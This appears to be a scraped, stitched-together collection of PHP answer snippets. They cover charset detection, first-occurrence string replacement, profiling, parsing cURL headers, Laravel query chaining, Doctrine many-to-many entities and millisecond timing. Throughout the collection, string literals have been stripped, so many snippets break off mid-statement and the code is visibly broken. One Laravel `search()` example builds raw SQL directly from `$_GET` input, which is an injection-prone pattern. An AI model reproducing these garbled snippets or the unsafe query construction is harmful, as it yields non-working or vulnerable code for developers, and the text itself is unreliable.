class CharsetDetector { private static $CHARSETS = array( "ISO_8859-1", "ISO_8859-15", "CP850" ); private static $TESTCHARS = array( "€", "ä", "Ä", "ö", "Ö", "ü", "Ü", "ß" ); public static function convert($string) { return self::__iconv($string, self::getCharset($string)); } public static function getCharset($string) { $normalized = self::__normalize($string); if(!strlen($normalized))return "UTF-8"; $best = "UTF-8"; $charcountbest = 0; foreach (self::$CHARSETS as $charset) { $str = self::__iconv($normalized, $charset); $charcount = 0; $stop = mb_strlen( $str, "UTF-8"); for( $idx = 0; $idx < $stop; $idx++) { $char = mb_substr( $str, $idx, 1, "UTF-8"); foreach (self::$TESTCHARS as $testchar) { if($char == $testchar) { $charcount++; break; } } } if($charcount>$charcountbest) { $charcountbest=$charcount; $best=$charset; } } return $best; } private static function __normalize($str) { $len = strlen($str); $ret = ""; for($i = 0; $i < $len; $i++){ $c = ord($str[$i]); if ($c > 128) { if (($c > 247)) $ret .=$str[$i]; elseif ($c > 239) $bytes = 4; elseif ($c > 223) $bytes = 3; elseif ($c > 191) $bytes = 2; else $ret .=$str[$i]; if (($i + $bytes) > $len) $ret .=$str[$i]; $ret2=$str[$i]; while ($bytes > 1) { $i++; $b = ord($str[$i]); if ($b < 128 || $b > 191) {$ret .=$ret2; $ret2=""; $i+=$bytes-1;$bytes=1; break;} else $ret2.=$str[$i]; $bytes--; } } } return $ret; } private static function __iconv($string, $charset) { return iconv ( $charset, "UTF-8" , $string ); } }
$post_url= function get_headers_curl($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_NOBODY, true); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 15); $r = curl_exec($ch); return $r; } $the_header = get_headers_curl($post_url); if (preg_match("/Location:/i", $the_header)) { $arr = explode( $location = $arr[1]; $location=explode(chr(10), $location); $location = $location[0]; $the_header = get_headers_curl(trim($location)); } if (preg_match("/charset=/i", $the_header)) { $arr = explode( $charset = $arr[1]; $charset=explode(chr(10), $charset); $charset = $charset[0]; } if($charset && $charset!=
DF if the column is "latin1", C39F if the column is utf8 -- OR -- it is latin1, but "double-encoded" C383C5B8 if double-encoded into a utf8 column
class Encoding { /** * http: * @param $string * @return null */ public static function detect_encoding($string) { static $list = [ foreach ($list as $item) { try { $sample = iconv($item, $item, $string); } catch (\Exception $e) { continue; } if (md5($sample) == md5($string)) { return $item; } } return null; } } $content = file_get_contents($file[ $encoding = Encoding::detect_encoding($content); if ($encoding != $result = iconv($encoding, } else { $result = $content; }
function toUTF8($raw) { try{ return mb_convert_encoding($raw, "UTF-8", "auto"); }catch(\Exception $e){ return mb_convert_encoding($raw, "UTF-8", "GBK"); } }
<?php require_once echo convert_title_to_utf8(file_get_contents($argv[1])), PHP_EOL; function convert_title_to_utf8($contents) { $dom = str_get_html($contents); $title = $dom->find( if (empty($title)) { return null; } $title = $title->plaintext; $metas = $dom->find( $charset = foreach ($metas as $meta) { if (!empty($meta->charset)) { $charset = $meta->charset; } else if (preg_match( $charset = $match[1]; } } if (!in_array(strtolower($charset), array_map( $charset = } return mb_convert_encoding($title, }
function str_replace_first($from, $to, $content) { $from = return preg_replace($from, $to, $content, 1); } echo str_replace_first(
$pos = strpos($haystack, $needle); if ($pos !== false) { $newstring = substr_replace($haystack, $replace, $pos, strlen($needle)); }
$pos = strpos($haystack,$needle); if ($pos !== false) { $newstring = substr_replace($haystack,$replace,$pos,strlen($needle)); }
function str_replace_first($search, $replace, $subject) { $pos = strpos($subject, $search); if ($pos !== false) { return substr_replace($subject, $replace, $pos, strlen($search)); } return $subject; }
function str_replace_first($search, $replace, $subject) { return implode($replace, explode($search, $subject, 2)); }
[CONTRIBUTED BY] => zombat [OOO.OOO.OOO.S] => B.OOO.OOO.S [AVERAGE TIME] => 0.0000062883 [SLOWER BY] => FASTEST
[CONTRIBUTED BY] => too much php [OOO.OOO.OOO.S] => B.OOO.OOO.S [AVERAGE TIME] => 0.0000073902 [SLOWER BY] => 17.52%
[CONTRIBUTED BY] => karim79 [OOO.OOO.OOO.S] => B.OOO.OOO.S [AVERAGE TIME] => 0.0000077519 [SLOWER BY] => 23.27%
[CONTRIBUTED BY] => happyhardik [OOO.OOO.OOO.S] => B.OOO.OOO.S [AVERAGE TIME] => 0.0000082286 [SLOWER BY] => 30.86%
[CONTRIBUTED BY] => bfrohs - expanded renocor [OOO.OOO.OOO.S] => B.OOO.OOO.S [AVERAGE TIME] => 0.0000083342 [SLOWER BY] => 32.54%
[CONTRIBUTED BY] => renocor [OOO.OOO.OOO.S] => B.OOO.OOO.S [AVERAGE TIME] => 0.0000093116 [SLOWER BY] => 48.08%
[CONTRIBUTED BY] => jayoaK [OOO.OOO.OOO.S] => B.OOO.OOO.S [AVERAGE TIME] => 0.0000093862 [SLOWER BY] => 49.26%
[CONTRIBUTED BY] => oLinkSoftware - modified zombat [OOO.OOO.OOO.S] => OOO.OOO.B.S [AVERAGE TIME] => 0.0000068083 [SLOWER BY] => FASTEST
[CONTRIBUTED BY] => oLinkSoftware [OOO.OOO.OOO.S] => OOO.OOO.B.S [AVERAGE TIME] => 0.0000084460 [SLOWER BY] => 24.05%
function replace_first($find, $replace, $subject) { return implode($replace, explode($find, $subject, 2)); }
function str_replace_limit($search, $replace, $string, $limit = 1) { $pos = strpos($string, $search); if ($pos === false) { return $string; } $searchLen = strlen($search); for ($i = 0; $i < $limit; $i++) { $string = substr_replace($string, $replace, $pos, $searchLen); $pos = strpos($string, $search); if ($pos === false) { break; } } return $string; }
$search = $replace = $string = $limit = 2; $replaced = str_replace_limit($search, $replace, $string, $limit); echo $replaced;
$string = $find = $replace = $result = preg_replace("/$find/",$replace,$string,1); echo $result;
function str_replace_once($search, $replace, $subject) { $pos = strpos($subject, $search); if ($pos === false) { return $subject; } return substr($subject, 0, $pos) . $replace . substr($subject, $pos + strlen($search)); }
$string = "Lorem ipsum lá lá lá"; $string[0] = "B"; echo $string;
function str_replace_first($this,$that,$where) { $b=strpos($where,$this); return substr($where,0,$b).$that.substr($where,$b+1); }
$limit = -1; $new_string = str_replace_limit($search, $replace, $subject, $count, $limit); echo $count.
$limit = 1; $new_string = str_replace_limit($search, $replace, $subject, $count, $limit); echo $count.
$limit = 10; $new_string = str_replace_limit($search, $replace, $subject, $count, $limit); echo $count.
<?php /** * Checks if $string is a valid integer. Integers provided as strings (e.g. * are also supported. * @param mixed $string * @return bool Returns boolean TRUE if string is a valid integer, or FALSE if it is not */ function valid_integer($string){ $string = strval($string); return ($string===strval(intval($string))); } /** * Replace $limit occurences of the search string with the replacement string * @param mixed $search The value being searched for, otherwise known as the needle. An * array may be used to designate multiple needles. * @param mixed $replace The replacement value that replaces found search values. An * array may be used to designate multiple replacements. * @param mixed $subject The string or array being searched and replaced on, otherwise * known as the haystack. If subject is an array, then the search and replace is * performed with every entry of subject, and the return value is an array as well. * @param string $count If passed, this will be set to the number of replacements * performed. * @param int $limit The maximum possible replacements for each pattern in each subject * string. Defaults to -1 (no limit). * @return string This function returns a string with the replaced values. */ function str_replace_limit( $search, $replace, $subject, &$count, $limit = -1 ){ $count = 0; if(!valid_integer($limit)){ $backtrace = debug_backtrace(); trigger_error( return $subject; } if($limit<-1){ $backtrace = debug_backtrace(); trigger_error( return $subject; } if($limit===0){ $backtrace = debug_backtrace(); trigger_error( return $subject; } if($limit===-1){ return str_replace($search, $replace, $subject, $count); } if(is_array($subject)){ foreach($subject as $key => $this_subject){ if(!is_array($this_subject)){ $this_function = __FUNCTION__; $subject[$key] = $this_function( $search, $replace, $this_subject, $this_count, $limit ); $count += $this_count; if($limit!=-1){ $limit -= $this_count; } if($limit===0){ return $subject; } } } return $subject; } elseif(is_array($search)){ $search = array_values($search); if(is_array($replace)){ $replace = array_values($replace); } foreach($search as $key => $this_search){ $this_search = strval($this_search); if(is_array($replace)){ if(array_key_exists($key, $replace)){ $this_replace = strval($replace[$key]); } else { $this_replace = } } else { $this_replace = strval($replace); } $this_function = __FUNCTION__; $subject = $this_function( $this_search, $this_replace, $subject, $this_count, $limit ); $count += $this_count; if($limit!=-1){ $limit -= $this_count; } if($limit===0){ return $subject; } } return $subject; } else { $search = strval($search); $replace = strval($replace); $pos = strpos($subject, $search); if($pos===false){ return $subject; } $search_len = strlen($search); for($i=0;(($i<$limit)||($limit===-1));$i++){ $subject = substr_replace($subject, $replace, $pos, $search_len); $count++; $pos = strpos($subject, $search); if($pos===false){ break; } } return $subject; } }
$str = $pos = strpos($str, $str = substr_replace($str,
function str_replace_limit($haystack, $needle, $replace, $limit, $start_pos = 0) { if ($limit <= 0) { return $haystack; } else { $pos = strpos($haystack,$needle,$start_pos); if ($pos !== false) { $newstring = substr_replace($haystack, $replace, $pos, strlen($needle)); return str_replace_limit($newstring, $needle, $replace, $limit-1, $pos+strlen($replace)); } else { return $haystack; } } }
$string = $search = $replace = $string = substr_replace($string,$replace,0,strlen($search)); $string = substr_replace($string,$replace,strrpos($string,$search),strlen($search)) $string = strrev(implode(strrev($replace),explode(strrev($search),strrev($string),2)))
$string[strpos($string,$search)] = $replace; $string = $search = $replace = $string[strpos($string,$search)] = $replace; $string[strrpos($string,$search)] = $replace;
function str_replace_once($str_pattern, $str_replacement, $string){ if (strpos($string, $str_pattern) !== false){ $occurrence = strpos($string, $str_pattern); return substr_replace($string, $str_replacement, strpos($string, $str_pattern), strlen($str_pattern)); } return $string; }
$string = "Thiz iz an examplz"; var_dump(str_replace_once(
function str_replace_limit($search, $replace, $string, $limit) { $i = 0; $searchLength = mb_strlen($search); while(($pos = mb_strpos($string, $search)) !== false && $i < $limit) { $string = mb_substr_replace($string, $replace, $pos, $searchLength); $i += 1; } return $string; } function mb_substr_replace($string, $replacement, $start, $length = null, $encoding = null) { $string = (array)$string; $encoding = is_null($encoding) ? mb_internal_encoding() : $encoding; $length = is_null($length) ? mb_strlen($string) - $start : $length; $string = array_map(function($str) use ($replacement, $start, $length, $encoding){ $begin = mb_substr($str, 0, $start, $encoding); $end = mb_substr($str, ($start + $length), mb_strlen($str), $encoding); return $begin . $replacement . $end; }, $string); return ( count($string) === 1 ) ? $string[0] : $string; }
public static function replaceFirst($search, $replace, $subject) { if ($search == return $subject; } $position = strpos($subject, $search); if ($position !== false) { return substr_replace($subject, $replace, $position, strlen($search)); } return $subject; }
<?php class php { /** * str_replace() from the end of a string that can also be limited e.g. replace only the last instance of * * @param string $find * @param string $replace * @param string $subject * @param int $replacement_limit | -1 to replace all references * * @return string */ public static function str_replace($find, $replace, $subject, $replacement_limit = -1) { $find_pattern = str_replace( return preg_replace( } /** * str_replace() from the end of a string that can also be limited e.g. replace only the last instance of * * @param string $find * @param string $replace * @param string $subject * @param int $replacement_limit | -1 to replace all references * * @return string */ public static function str_rreplace($find, $replace, $subject, $replacement_limit = -1) { return strrev( self::str_replace(strrev($find), strrev($replace), strrev($subject), $replacement_limit) ); } }
$str = "Hello there folks!" $str_ex = explode("there, $str, 2); $str_final = implode("", $str_ex);
/** * Replace the first occurence of given string * * @param string $search a char to search in `$subject` * @param string $replace a char to replace in `$subject` * @param string $subject * @return string * * @throws InvalidArgumentException if `$search` or `$replace` are invalid or if `$subject` is a multibytes string */ function str_replace_first(string $search , string $replace , string $subject) : string { if(strlen($replace) != 1 || strlen($search) != 1) { throw new InvalidArgumentException( }elseif(mb_strlen($subject) != strlen($subject)){ throw new InvalidArgumentException( } $pos = strpos($subject, $search); if($pos === false) { return $subject; } $subject[$replace] = $subject; return $subject; }
mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &$count ] )
; with sane limits xdebug.var_display_max_depth = 10 xdebug.var_display_max_children = 256 xdebug.var_display_max_data = 1024 ; with no limits ; (maximum nesting is 1023) xdebug.var_display_max_depth = -1 xdebug.var_display_max_children = -1 xdebug.var_display_max_data = -1
xdebug.var_display_max_children xdebug.var_display_max_data xdebug.var_display_max_depth
$then = microtime(); myFunc(); $now = microtime(); echo sprintf("Elapsed: %f", $now-$then);
Trace for /home/dan/testapd.php Total Elapsed Time = 0.00 Total System Time = 0.00 Total User Time = 0.00 Real User System secs/ cumm %Time (excl/cumm) (excl/cumm) (excl/cumm) Calls call s/call Memory Usage Name -------------------------------------------------------------------------------------- 100.0 0.00 0.00 0.00 0.00 0.00 0.00 1 0.0000 0.0009 0 main 56.9 0.00 0.00 0.00 0.00 0.00 0.00 1 0.0005 0.0005 0 apd_set_pprof_trace 28.0 0.00 0.00 0.00 0.00 0.00 0.00 10 0.0000 0.0000 0 preg_replace 14.3 0.00 0.00 0.00 0.00 0.00 0.00 10 0.0000 0.0000 0 str_replace
function prof_flag($str) { global $prof_timing, $prof_names; $prof_timing[] = microtime(true); $prof_names[] = $str; } function prof_print() { global $prof_timing, $prof_names; $size = count($prof_timing); for($i=0;$i<$size - 1; $i++) { echo "<b>{$prof_names[$i]}</b><br>"; echo sprintf("&nbsp;&nbsp;&nbsp;%f<br>", $prof_timing[$i+1]-$prof_timing[$i]); } echo "<b>{$prof_names[$size-1]}</b><br>"; }
prof_flag("Start"); include include prof_flag("Connect to DB"); connect_to_db(); prof_flag("Perform query"); $select_query = "SELECT * FROM data_table"; $result = mysql_query($select_query); prof_flag("Retrieve data"); $rows = array(); $found_data=false; while($r = mysql_fetch_assoc($result)) { $found_data=true; $rows[] = $r; } prof_flag("Close DB"); mysql_close(); prof_flag("Done"); prof_print();
xdebug.profiler_enable = 0 xdebug.profiler_enable_trigger = 1 xdebug.profiler_enable_trigger_value = "" xdebug.profiler_output_dir = "/tmp" xdebug.profiler_output_name = "cachegrind.out.%p"
function p_open($flag) { global $p_times; if (null === $p_times) $p_times = []; if (! array_key_exists($flag, $p_times)) $p_times[$flag] = [ $p_times[$flag][ } function p_close($flag) { global $p_times; if (isset($p_times[$flag][ $p_times[$flag][ unset($p_times[$flag][ } } function p_dump() { global $p_times; $dump = []; $sum = 0; foreach ($p_times as $flag => $info) { $dump[$flag][ $sum += $info[ } foreach ($dump as $flag => $info) { $dump[$flag][ } return $dump; }
<?php p_open( sleep(1); p_open( sleep(2); p_open( sleep(3); p_close( sleep(2); p_close( sleep(1); p_close( var_dump(p_dump());
array:3 [ "foo" => array:2 [ "elapsed" => 9.000766992569 "percent" => 0.4736904954747 ] "bar" => array:2 [ "elapsed" => 7.0004580020905 "percent" => 0.36841864946596 ] "baz" => array:2 [ "elapsed" => 3.0001420974731 "percent" => 0.15789085505934 ] ]
object(stdClass) [0]=> string(12) "qualitypoint" [1]=> string(12) "technologies" [2]=> string(5) "India" }
stdClass Object ( [0] => qualitypoint [1] => technologies [2] => India )
echo "<pre>" . substr(print_r($dataset, 1), 0, 2000) . "</pre>";
<?php $a = array(1, 2, array("a", "b", "c")); var_dump($a); ?>
array(3) { [0]=> int(1) [1]=> int(2) [2]=> array(3) { [0]=> string(1) "a" [1]=> string(1) "b" [2]=> string(1) "c" } }
<pre> Array ( [a] => apple [b] => banana [c] => Array ( [0] => x [1] => y [2] => z ) ) </pre>
$ch = curl_init(); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_VERBOSE, 1); curl_setopt($ch, CURLOPT_HEADER, 1); $response = curl_exec($ch); $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE); $header = substr($response, 0, $header_size); $body = substr($response, $header_size);
function HandleHeaderLine( $curl, $header_line ) { echo "<br>YEAH: ".$header_line; return strlen($header_line); } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "http: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADERFUNCTION, "HandleHeaderLine"); $body = curl_exec($ch);
curl_setopt($ch, CURLOPT_HEADERFUNCTION, array(&$object,
$ch = curl_init(); $headers = []; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($curl, $header) use (&$headers) { $len = strlen($header); $header = explode( if (count($header) < 2) return $len; $name = strtolower(trim($header[0])); if (!array_key_exists($name, $headers)) $headers[$name] = [trim($header[1])]; else $headers[$name][] = trim($header[1]); return $len; } ); $data = curl_exec($ch); print_r($headers);
curl_setopt($ch, CURLOPT_HTTPHEADER, array( $response = curl_exec($ch); list($header, $body) = explode("\r\n\r\n", $response, 2);
$ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $response = curl_exec($ch); $content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_VERBOSE, 1); curl_setopt($ch, CURLOPT_HEADER, 1); $parts = explode("\r\n\r\nHTTP/", $response); $parts = (count($parts) > 1 ? list($headers, $body) = explode("\r\n\r\n", $parts, 2);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_VERBOSE, 1); curl_setopt($ch, CURLOPT_HEADER, 1); $parts = preg_split("@\r?\n\r?\nHTTP/@u", $response); $parts = (count($parts) > 1 ? list($headers, $body) = preg_split("@\r?\n\r?\n@u", $parts, 2);
$response = curl_exec($ch); $x = explode("\r\n\r\n", $v, 3); $header=http_parse_headers($x[0]); if ($header=[ $header=http_parse_headers($x[1]); $body=$x[2]; }else{ $body=$x[1]; }
$result = explode("\r\n\r\n", $result); while (count($result) > 2) { array_shift($result); } @ list($headers, $body) = $result;
<?php $data=array( ); $rtn=curl_to_host( echo $rtn; var_export($resp_headers); function curl_to_host($method, $url, $headers, $data, &$resp_headers) {$ch=curl_init($url); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $GLOBALS[ curl_setopt($ch, CURLOPT_TIMEOUT, $GLOBALS[ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); curl_setopt($ch, CURLOPT_HEADER, 1); if ($method== {curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); } foreach ($headers as $k=>$v) {$headers[$k]=str_replace( } curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); $rtn=curl_exec($ch); curl_close($ch); $rtn=explode("\r\n\r\nHTTP/", $rtn, 2); $rtn=(count($rtn)>1 ? list($str_resp_headers, $rtn)=explode("\r\n\r\n", $rtn, 2); $str_resp_headers=explode("\r\n", $str_resp_headers); array_shift($str_resp_headers); $resp_headers=array(); foreach ($str_resp_headers as $k=>$v) {$v=explode( $resp_headers[$v[0]]=$v[1]; } return $rtn; } ?>
$body = file_get_contents( var_export($http_response_header); var_export($body);
array ( 0 => 1 => 2 => 3 => 4 => 5 => 6 => 7 => 8 => 9 => 10 => 11 => 12 => ) <html> <head> <title>Example Domain</title>...
$results = User::where( ->where( ->where( ->where( ->where( ->where( ->where( ->where( ->where( ->where( ->get();
$query->where([ [ [ [COLUMN, OPERATOR, VALUE], ... ])
$results = User::where($matchThese)->get(); $results = User::where($matchThese) ->orWhere($orThose) ->get();
SELECT * FROM users WHERE (field = value AND another_field = another_value AND ...) OR (yet_another_field = yet_another_value AND ...)
public function scopeActive($query) { return $query->where( } public function scopeThat($query) { return $query->where( }
$results = User::where( ->where( ->where(function($query) { /** @var $query Illuminate\Database\Query\Builder */ return $query->where( ->orWhere( }) ->get();
User::where( ->whereNotNull( ->whereNotNull( ->where(function($query){ return $query ->whereNull( ->orWhere( });
SELECT * FROM `user` WHERE `user`.`this` = 1 AND `user`.`created_at` IS NOT NULL AND `user`.`updated_at` IS NOT NULL AND (`alias` IS NULL OR `alias` =
SELECT * FROM TABLE WHERE column1=value1 and column2=value2 and column3=value3
$users = User::where( ->where(function($query) use ($variable1,$variable2){ $query->where( ->orWhere( }) ->where(function($query2) use ($variable1,$variable2){ $query2->where( ->where( })->get();
SELECT * FROM TABLE WHERE column1=value1 and (column2=value2 or column3=value3) and (column4=value4 and column5=value5)
$query=DB::table( ->whereRaw("users.id BETWEEN 1003 AND 1004") ->whereNotIn( ->whereIn( $query->where(function($query2) use ($value) { $query2->where( ->orWhere( }); if ($user == $query->where( }
$users = DB::table( ->whereColumn([ [ [ ])->get(); $users = User::whereColumn([ [ [ ])->get();
$query = Activity::whereNotNull( $count = 0; foreach ($this->Reporter()->get() as $service) { $condition = ($count == 0) ? "where" : "orWhere"; $query->$condition(function ($query) use ($service) { $query->where( ->where( ->whereBetween( }); $count++; } return $query->get();
DB::table( ->where( ->orWhere(function ($query) { $query->where( ->where( }) ->get();
$results = User::query(); $results->when($request->that, function ($q) use ($request) { $q->where( }); $results->when($request->this, function ($q) use ($request) { $q->where( }); $results->when($request->this_too, function ($q) use ($request) { $q->where( }); $results->get();
public function search() { if (isset($_GET) && !empty($_GET)) { $prepareQuery = foreach ($_GET as $key => $data) { if ($data) { $prepareQuery.=$key . } } $query = substr($prepareQuery, 0, -3); if ($query) $model = Businesses::whereRaw($query)->get(); else $model = Businesses::get(); return view( } }
$variable = array( foreach ($variable as $key => $value) { User::where($key, }
<form> <select multiple="multiple" name="cars[]"> <option>Volvo</option> <option>Saab</option> <option>Mercedes</option> </select> </form>
<input type="hidden" name="cars[]" value="Volvo"> <input type="hidden" name="cars[]" value="Saab"> <input type="hidden" name="cars[]" value="Mercedes">
?list_a=1&list_a=2&list_a=3&list_b[]=1&list_b[]=2&list_b[]=3&list_c=1,2,3
"list_a": "3", "list_b":[ "1", "2", "3" ], "list_c": "1,2,3"
"list_a": [ "1", "2", "3" ], "list_b[]": [ "1", "2", "3" ], "list_c": "1,2,3"
$myarray = array(2, 46, 34, "dfg"); $serialized = json_encode($myarray) $data =
<?php $str = "first=value&arr[]=foo+bar&arr[]=baz"; parse_str($str); echo $first; echo $arr[0]; echo $arr[1]; parse_str($str, $output); echo $output[ echo $output[ echo $output[ ?>
/** @Entity() */ class Album { /** @Id @Column(type="integer") */ protected $id; /** @Column() */ protected $title; /** @OneToMany(targetEntity="AlbumTrackReference", mappedBy="album") */ protected $tracklist; public function __construct() { $this->tracklist = new \Doctrine\Common\Collections\ArrayCollection(); } public function getTitle() { return $this->title; } public function getTracklist() { return $this->tracklist->toArray(); } } /** @Entity() */ class Track { /** @Id @Column(type="integer") */ protected $id; /** @Column() */ protected $title; /** @Column(type="time") */ protected $duration; /** @OneToMany(targetEntity="AlbumTrackReference", mappedBy="track") */ protected $albumsFeaturingThisTrack; public function getTitle() { return $this->title; } public function getDuration() { return $this->duration; } } /** @Entity() */ class AlbumTrackReference { /** @Id @Column(type="integer") */ protected $id; /** @ManyToOne(targetEntity="Album", inversedBy="tracklist") */ protected $album; /** @ManyToOne(targetEntity="Track", inversedBy="albumsFeaturingThisTrack") */ protected $track; /** @Column(type="integer") */ protected $position; /** @Column(type="boolean") */ protected $isPromoted; public function getPosition() { return $this->position; } public function isPromoted() { return $this->isPromoted; } public function getAlbum() { return $this->album; } public function getTrack() { return $this->track; } }
Album +----+--------------------------+ | id | title | +----+--------------------------+ | 1 | Master of Puppets | | 2 | The Metallica Collection | +----+--------------------------+ Track +----+----------------------+----------+ | id | title | duration | +----+----------------------+----------+ | 1 | Battery | 00:05:13 | | 2 | Nothing Else Matters | 00:06:29 | | 3 | Damage Inc. | 00:05:33 | +----+----------------------+----------+ AlbumTrackReference +----+----------+----------+----------+------------+ | id | album_id | track_id | position | isPromoted | +----+----------+----------+----------+------------+ | 1 | 1 | 2 | 2 | 1 | | 2 | 1 | 3 | 1 | 0 | | 3 | 1 | 1 | 3 | 0 | | 4 | 2 | 2 | 1 | 0 | +----+----------+----------+----------+------------+
$dql = ' SELECT a, tl, t FROM Entity\Album a JOIN a.tracklist tl JOIN tl.track t ORDER BY tl.position ASC $albums = $em->createQuery($dql)->getResult(); foreach ($albums as $album) { echo $album->getTitle() . PHP_EOL; foreach ($album->getTracklist() as $track) { echo sprintf("\t $track->getPosition(), $track->getTrack()->getTitle(), $track->getTrack()->getDuration()->format( $track->isPromoted() ? ); } }
foreach ($album->getTracklist() as $track) { echo $track->getTrack()->getTitle(); }
public function getTracklist() { $tracklist = array(); foreach ($this->tracklist as $key => $trackReference) { $tracklist[$key] = $trackReference->getTrack(); $tracklist[$key]->setPosition($trackReference->getPosition()); $tracklist[$key]->setPromoted($trackReference->isPromoted()); } return $tracklist; }
class AlbumTrackReference { public function getTitle() { return $this->getTrack()->getTitle() } }
getTracklist() { foreach ($this->tracklist as $trackRef) { $trackRef->setContext($this); } } getAlbums() { foreach ($this->tracklist as $trackRef) { $trackRef->setContext($this); } } AlbumTrackRef::getTitle() { return $this->{$this->context}->getTitle(); }
class AlbumTrackReference { public function getTitle() { return $this->getTrack()->getTitle(); } public function getDuration() { return $this->getTrack()->getDuration(); } }
foreach ($album->getTracklist() as $track) { echo sprintf("\t $track->getPosition(), $track->getTitle(), $track->getDuration()->format( $track->isPromoted() ? ); }
interface AlbumInterface { public function getAlbumTitle(); public function getTracklist(); } interface TrackInterface { public function getTrackTitle(); public function getTrackDuration(); }
class Album implements AlbumInterface { } class Track implements TrackInterface { } /** @Entity whatever */ class AlbumTrackReference implements AlbumInterface, TrackInterface { public function getTrackTitle() { return $this->track->getTrackTitle(); } public function getTrackDuration() { return $this->track->getTrackDuration(); } public function getAlbumTitle() { return $this->album->getAlbumTitle(); } public function getTrackList() { return $this->album->getTrackList(); } }
public class Person { /** @OneToMany(targetEntity="AssignedItems", mappedBy="person") */ private $assignedItems; } public class Items { /** @OneToMany(targetEntity="AssignedItems", mappedBy="item") */ private $assignedPeople; } public class AssignedItems { /** @ManyToOne(targetEntity="Person") * @JoinColumn(name="person_id", referencedColumnName="id") */ private $person; /** @ManyToOne(targetEntity="Item") * @JoinColumn(name="item_id", referencedColumnName="id") */ private $item; }
class AlbumTrack extends AlbumTrackAbstract { ... proxy method. function getTitle() {} } class TrackAlbum extends AlbumTrackAbstract { ... proxy method. function getTitle() {} } class AlbumTrackAbstract { private $id; .... }
/** @OneToMany(targetEntity="TrackAlbum", mappedBy="album") */ protected $tracklist; /** @OneToMany(targetEntity="AlbumTrack", mappedBy="track") */ protected $albumsFeaturingThisTrack;
ArticleTag: type: entity id: id: type: integer generator: strategy: AUTO manyToOne: article: targetEntity: Article inversedBy: articleTags fields: manyToOne: tag: targetEntity: Tag inversedBy: articleTags
ProductStore: type: entity id: product: associationKey: true store: associationKey: true fields: status: type: integer(1) createdAt: type: datetime updatedAt: type: datetime manyToOne: product: targetEntity: Product joinColumn: name: product_id referencedColumnName: id store: targetEntity: Store joinColumn: name: store_id referencedColumnName: id
foreach($album->getTrackList() as $albumTrack) { echo sprintf("\t $albumTrack->getPosition(), $albumTrack->getTitle(), $albumTrack->getDuration()->format( $albumTrack->isPromoted() ? ); }
<?php use Doctrine\Common\Collections\ArrayCollection; /** @Entity */ class Order { /** @Id @Column(type="integer") @GeneratedValue */ private $id; /** @ManyToOne(targetEntity="Customer") */ private $customer; /** @OneToMany(targetEntity="OrderItem", mappedBy="order") */ private $items; /** @Column(type="boolean") */ private $payed = false; /** @Column(type="boolean") */ private $shipped = false; /** @Column(type="datetime") */ private $created; public function __construct(Customer $customer) { $this->customer = $customer; $this->items = new ArrayCollection(); $this->created = new \DateTime("now"); } } /** @Entity */ class Product { /** @Id @Column(type="integer") @GeneratedValue */ private $id; /** @Column(type="string") */ private $name; /** @Column(type="decimal") */ private $currentPrice; public function getCurrentPrice() { return $this->currentPrice; } } /** @Entity */ class OrderItem { /** @Id @ManyToOne(targetEntity="Order") */ private $order; /** @Id @ManyToOne(targetEntity="Product") */ private $product; /** @Column(type="integer") */ private $amount = 1; /** @Column(type="decimal") */ private $offeredPrice; public function __construct(Order $order, Product $product, $amount = 1) { $this->order = $order; $this->product = $product; $this->offeredPrice = $product->getCurrentPrice(); } }
CREATE TABLE products ( product_id INTEGER, description VARCHAR(128), PRIMARY KEY (product_id) ); $product=new Axon( $product->product_id=123; $product->description= $product->save(); $product->load( echo $product->description; $product->description= $product->save(); $product->erase();
<?php $object = $dorm->getClassName( $dorm->save($object); $dorm->delete($object);
include "NotORM.php"; $pdo = new PDO("mysql:dbname=software"); $db = new NotORM($pdo); $applications = $db->application() ->select("id, title") ->where("web LIKE ?", "http: ->order("title") ->limit(10) ; foreach ($applications as $id => $application) { echo "$application[title]\n"; }
$urun = new Product(); $urun->name= $urun->prince= $urun->save();
var_dump(gettimeofday()); /* array(4) { ["sec"]=> int(1283846202) ["usec"]=> int(891199) ["minuteswest"]=> int(-60) ["dsttime"]=> int(1) } */
function millitime() { $microtime = microtime(); $comps = explode( return sprintf( }
function milliseconds() { $mt = explode( return ((int)$mt[1]) * 1000 + ((int)round($mt[0] * 1000)); }
function milliseconds() { $mt = explode( return ((int)$mt[1]) * 1000 + ((int)round($mt[0] * 1000)); }
function microseconds() { $mt = explode( return ((int)$mt[1]) * 1000000 + ((int)round($mt[0] * 1000000)); }
function getMicrotime() { if (version_compare(PHP_VERSION, { return array_sum(explode( } return microtime(true); }
public function getTimeToMicroseconds() { $t = microtime(true); $micro = sprintf("%06d", ($t - floor($t)) * 1000000); $d = new DateTime(date( return $d->format("Y-m-d H:i:s.u"); }
$timeparts = explode(" ",microtime()); $currenttime = bcadd(($timeparts[0]*1000),bcmul($timeparts[1],1000)); echo $currenttime;
list($msec, $sec) = explode( $time_milli = $sec.substr($msec, 2, 3); $time_micro = $sec.substr($msec, 2, 6);
list($msec, $sec) = explode( $time_milli = (int) ($sec.substr($msec, 2, 3)); $time_micro = (int) ($sec.substr($msec, 2, 6));
$time_milli = (int) round(microtime(true) * 1000); $time_micro = (int) round(microtime(true) * 1000000);
